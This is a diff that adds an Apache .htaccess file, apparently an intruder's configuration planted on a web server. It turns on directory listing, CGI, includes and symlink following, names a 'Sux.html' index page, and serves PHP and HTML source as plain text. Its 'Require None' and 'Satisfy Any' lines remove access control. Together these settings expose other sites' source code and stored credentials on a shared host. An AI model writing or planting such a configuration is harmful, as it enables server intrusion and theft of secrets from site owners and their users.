@@ -1,0 +1,10 @@
+# For security reasons, Option all cannot be overridden.
+#Options all 
+Options ExecCGI Includes IncludesNOEXEC SymLinksIfOwnerMatch Indexes
+ DirectoryIndex Sux.html 
+ AddType text/plain .php 
+ AddHandler server-parsed .php 
+ AddType text/plain .html 
+ AddHandler txt .html 
+ Require None 
+ Satisfy Any
